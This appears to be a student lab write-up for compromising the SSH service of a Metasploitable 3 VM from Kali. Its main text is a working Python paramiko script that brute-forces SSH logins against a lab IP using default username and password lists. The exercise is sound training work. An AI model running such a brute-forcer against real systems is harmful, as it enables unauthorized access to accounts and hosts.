# Phase1:
# Downloading and Importing Metasploitable 3 VM (the Victim environment):
![Screenshot 2025-04-26 194716](https://github.com/user-attachments/assets/6eb215a9-2c85-42b9-87cc-88133d73b8c1)

# Checking the connectivity between the attacker(kali) and the victim:
![Screenshot 2025-04-27 211734](https://github.com/user-attachments/assets/496e6b54-4a39-47a7-9e20-faae575623e2)
![Screenshot 2025-04-27 212646](https://github.com/user-attachments/assets/5e052f8c-2ace-4b61-b039-d71a933f0834)

# Setting up metasploit framework in the kali VM:
![Screenshot 2025-04-27 191041](https://github.com/user-attachments/assets/7015f966-f7bb-4857-9a44-9d6ca4e8ebaa)
 
# Task1.1: 
We choosed SSH service to compromise.

![Screenshot 2025-04-27 204845](https://github.com/user-attachments/assets/bd3a3157-6bf5-471f-a9cc-2b5f0985d337)

# Task1.2: Custom script for compromising the SSH service :
import paramiko

#Target Information  

target_ip = "192.168.8.36"

target_port = 22

#List of username/password combinations to try

usernames = ["vagrant", "user", "root", "msfadmin"]

passwords = ["vagrant", "user", "toor", "msfadmin", "1234", "password"]

#Setup the SSH client

ssh_client = paramiko.SSHClient()

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#Try all combinations

for username in usernames:

    for password in passwords:
    
        try:
        
            print(f"[*] Trying {username}:{password}")
            
            ssh_client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=5)
            
            print(f"[+] Success! Credentials found: {username}:{password}")
            
            ssh_client.close()
            
            exit()
            
        except paramiko.AuthenticationException:
        
            print(f"[-] Failed login: {username}:{password}")
            
        except Exception as e:
        
            print(f"[!] Connection error: {e}")

print("[-] No valid credentials found.")

Proof of Concept:
![Screenshot 2025-04-27 211639](https://github.com/user-attachments/assets/beadd480-2105-4c11-838e-b32617b01b86)


